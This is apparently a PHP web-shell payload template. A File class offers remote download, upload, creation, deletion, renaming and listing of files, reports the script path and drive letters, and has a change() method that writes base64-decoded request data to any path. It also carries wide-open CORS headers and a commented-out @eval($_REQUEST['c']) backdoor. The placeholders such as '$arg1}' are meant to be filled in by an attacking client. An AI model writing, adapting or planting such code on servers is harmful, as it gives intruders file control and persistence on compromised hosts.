<?php

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: *');
header('Access-Control-Allow-Methods: *');
//header("Content-Type: text/html;charset=GBK");

//@eval($_REQUEST['c']);

//ini_set("display_errors", 'Off');
//error_reporting(0);
//error_reporting(E_ALL^E_NOTICE^E_WARNING);
//ini_set('always_populate_raw_post_data', -1);


class File {
    function download() {
        $file = '$arg1}';
        header('Content-Type: application/octet-stream');
        header('Content-Disposition:attachment;filename=' . basename($file));
        header('Content-Transfer-Encoding: binary');
        header('Expires:0');
        header('Content-Length:' . filesize($file));

        set_time_limit(0);
        $file = @fopen($file, 'rb');
        while (!feof($file)) {
            print(@fread($file, 1024 * 8));
            ob_flush();
            flush();
        }

//         echo @file_get_contents('download.php');
    }

    function upload() {
//        return var_dump($_FILES);
        try {
            if ($_FILES['$arg1}']['error']) echo 'ERROR://upload fail';
            else move_uploaded_file($_FILES['$arg1}']['tmp_name'], '$arg2}' . $_FILES['$arg1}']['name']);
        } catch (Exception $e) {
            echo 'ERROR://No Permission';
        }
    }

    function createFile() {
        @file_put_contents('$arg1}', '');
    }

    function createFolder() {
        mkdir('$arg1}');
    }

    function deleteFile() {
        @unlink('$arg1}');
    }

    function deleteFolder() {
        rmdir('$arg1}');
    }

    function rename() {
        @rename('$arg1}', '$arg2}');
    }

    function dir() {
        $dir = '$arg1}';
        if (!@is_dir($dir)) {
            echo "ERROR:// Path Not Found Or No Permission!";
        } else {
            $res = '';
            foreach (scandir($dir) as $value) {
                if ($value === '.' || $value === '..') continue;
                $file = $dir . $value;
                $res .= $value . '``' . (is_dir($file) ? '1' : '0') . '``' . date("Y/m/d H:i", filemtime($file)) . '``' . @filesize($file);
                $res .= "\n";
            }
            $d_f = 'print_r';
            echo $d_f($res);
        }
    }

    function pwd() {
        $path = dirname($_SERVER["SCRIPT_FILENAME"]);
        if ($path == "") $path = dirname($_SERVER["PATH_TRANSLATED"]);
        if ($path == "") $path = getcwd();
        $root_path = '';
        if (substr($path, 0, 1) != "/") {
            foreach (range("C", "Z") as $L) if (is_dir("{$L}:")) $root_path .= "{$L}:|";
        } else {
            $root_path .= "/";
        }
        $d_f = 'print_r';
        echo $d_f($root_path . '\`\`' . $path);
    }

    function change() {
        @file_put_contents('$arg1}', base64_decode($_POST['$arg2}']));
    }

    function end() {
    }
}

$f = new File();
$f->pwd();
?>
